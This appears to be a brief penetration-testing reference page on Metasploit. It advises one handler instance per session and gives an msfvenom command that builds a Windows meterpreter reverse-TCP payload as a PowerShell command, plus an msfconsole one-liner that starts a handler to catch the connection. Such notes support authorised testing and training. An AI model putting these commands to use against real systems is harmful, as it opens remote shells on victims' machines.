Metasploit Use

There are entire books written on metasploit. This page could be its own site. For now, this page will contain common syntax and some rules for use.

Information
Requires: metasploit

Metasploit Best Practice

When using metasploit to catch a payload, create a seperate metasploit instance for EACH session. Normally you might catch all sessions in one metasploit instance, but that means you can't go interactive in more than one session at a time. Using a seperate instance for each session meand you can go interactive with whatever sessions you need simultaniously. This also means all exploit should be thrown with "DisablePayloadHandler" set to "True" and a seperate payload created.


Common Commands

From command line, create a payload.
msfvenom -p [PAYLOAD] [OPTIONS] -f [filetype] -o [output_file]
Example:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.142.134 LPORT=4444 -f psh-cmd -o meter_powershell

For windows meterpreter payload generation, try running meterpreterbuilder.
Launch a handler example:
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.142.134; set lport 4444;show options;run"
